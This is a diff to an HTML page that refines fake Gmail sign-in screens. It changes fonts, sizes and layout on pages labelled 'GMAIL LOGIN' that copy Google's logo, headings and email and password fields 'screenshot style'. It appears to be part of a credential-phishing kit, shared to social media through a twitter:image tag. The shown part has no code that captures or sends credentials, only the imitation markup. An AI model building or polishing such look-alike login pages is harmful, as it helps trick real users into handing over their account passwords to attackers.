@@ -20,7 +20,7 @@
     <meta id="tw_image" name="twitter:image" content="https://i.ibb.co/3mJp9NXm/In-Shot-20261111-182343696.jpg">
 
     <style>
-        * { box-sizing: border-box; font-family: Roboto, -apple-system, sans-serif; }
+        * { box-sizing: border-box; font-family: sans-serif; }
         body { margin: 0; background: #0A0A0F; color: #FFFFFF; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
         .page { display: none; width: 100%; max-width: 450px; min-height: 100vh; flex-direction: column; }
         .page.active { display: flex; }
@@ -98,49 +98,45 @@
         </div>
     </div>
 
-    <!-- PAGE 2: GMAIL LOGIN -->
+    <!-- PAGE 2: GMAIL LOGIN (STEP 1) -->
     <div id="page2" class="page" style="background: #0B0B0B; padding: 24px;">
-        <div style="font-size: 48px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
-        <div style="font-size: 32px; color: #E8EAED; margin-top: 20px; font-weight: 500;">Sign in</div>
-        <div style="font-size: 16px; color: #E8EAED; margin-top: 12px;">Use your Google Account</div>
+        <div style="font-size: 64px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
+        <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Sign in</div>
+        <div style="font-size: 18px; color: #E8EAED; margin-top: 28px;">Use your Google Account</div>
 
-        <div style="position: relative; width: 100%; margin-top: 40px;">
-            <input type="text" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 56px; padding: 12px 14px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
-        </div>
+        <input type="email" id="edittext_email" placeholder="Email or phone" style="width: 100%; height: 60px; margin-top: 55px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
 
-        <div style="font-size: 14px; font-weight: 500; color: #A8C7FA; margin-top: 16px; cursor: pointer;">Forgot email?</div>
-
+        <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 18px; cursor: pointer;">Forgot email?</div>
+        
         <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 60px;">
-            <div style="font-size: 14px; color: #A8C7FA; font-weight: 500; cursor: pointer;">Create account</div>
-            <div id="btn_next_email" style="background: #A8C7FA; color: #001D35; padding: 10px 24px; border-radius: 20px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</div>
+            <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; cursor: pointer;">Create account</div>
+            <div id="btn_next_email" style="background: #A8C7FA; color: #001D35; padding: 12px 28px; border-radius: 20px; font-weight: bold; font-size: 15px; cursor: pointer;">Next</div>
         </div>
     </div>
 
-    <!-- PAGE 3: GMAIL LOGIN - WELCOME (SCREENSHOT STYLE) -->
+    <!-- PAGE 3: GMAIL LOGIN - WELCOME (SCREENSHOT UI STYLE) -->
     <div id="page3" class="page" style="background: #0B0B0B; padding: 24px;">
-        <div style="font-size: 48px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
-        <div style="font-size: 32px; color: #E8EAED; margin-top: 20px; font-weight: 500;">Welcome</div>
+        <div style="font-size: 64px; font-weight: bold; color: #4285F4; margin-top: 24px;">G</div>
+        <div style="font-size: 36px; color: #E8EAED; margin-top: 24px;">Welcome</div>
 
-        <!-- Selected Account Pill (Screenshot 2 style) -->
-        <div style="display: inline-flex; align-items: center; border: 1px solid #5f6368; border-radius: 20px; padding: 6px 14px; margin-top: 20px; background: #131314; width: fit-content;">
-            <div style="width: 20px; height: 20px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; color: #fff; margin-right: 8px;">👤</div>
-            <span id="display_email" style="font-size: 13px; color: #E8EAED;">user@gmail.com</span>
-            <span style="font-size: 12px; color: #9aa0a6; margin-left: 6px;">▼</span>
+        <!-- Selected Account Pill (Screenshot Style) -->
+        <div style="display: inline-flex; align-items: center; border: 1.5px solid #5f6368; border-radius: 20px; padding: 6px 14px; margin-top: 22px; background: #131314; width: fit-content;">
+            <div style="width: 22px; height: 22px; background: #5f6368; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #fff; margin-right: 8px;">👤</div>
+            <span id="display_email" style="font-size: 14px; color: #E8EAED; font-weight: 500;">user@gmail.com</span>
+            <span style="font-size: 12px; color: #9aa0a6; margin-left: 8px;">▼</span>
         </div>
 
-        <!-- Password Input Box -->
-        <div style="position: relative; width: 100%; margin-top: 40px;">
-            <input type="password" id="edittext_password" placeholder="Enter your password" style="width: 100%; height: 56px; padding: 12px 14px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 4px; outline: none;">
+        <input type="password" id="edittext_password" placeholder="Enter your password" style="width: 100%; height: 60px; margin-top: 45px; padding: 12px; font-size: 16px; color: #E8EAED; background: #131314; border: 1.5px solid #A8C7FA; border-radius: 8px; outline: none;">
+
+        <div style="display: flex; align-items: center; margin-top: 18px;">
+            <input type="checkbox" id="chk_show_password" style="width: 20px; height: 20px; cursor: pointer; accent-color: #A8C7FA;">
+            <label for="chk_show_password" style="font-size: 15px; color: #E8EAED; margin-left: 10px; cursor: pointer;">Show password</label>
         </div>
 
-        <div style="display: flex; align-items: center; margin-top: 16px;">
-            <input type="checkbox" id="chk_show_password" style="width: 18px; height: 18px; cursor: pointer; accent-color: #A8C7FA;">
-            <label for="chk_show_password" style="font-size: 14px; color: #E8EAED; margin-left: 10px; cursor: pointer;">Show password</label>
-        </div>
+        <div style="font-size: 15px; font-weight: bold; color: #A8C7FA; margin-top: 24px; cursor: pointer;">Forgot password?</div>
 
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 60px;">
-            <div style="font-size: 14px; color: #A8C7FA; font-weight: 500; cursor: pointer;">Forgot password?</div>
-            <div id="btn_next_password" style="background: #A8C7FA; color: #001D35; padding: 10px 24px; border-radius: 20px; font-weight: 500; font-size: 14px; cursor: pointer;">Next</div>
+        <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 50px;">
+            <div id="btn_next_password" style="background: #A8C7FA; color: #001D35; padding: 12px 28px; border-radius: 20px; font-weight: bold; font-size: 15px; cursor: pointer;">Next</div>
         </div>
     </div>
 
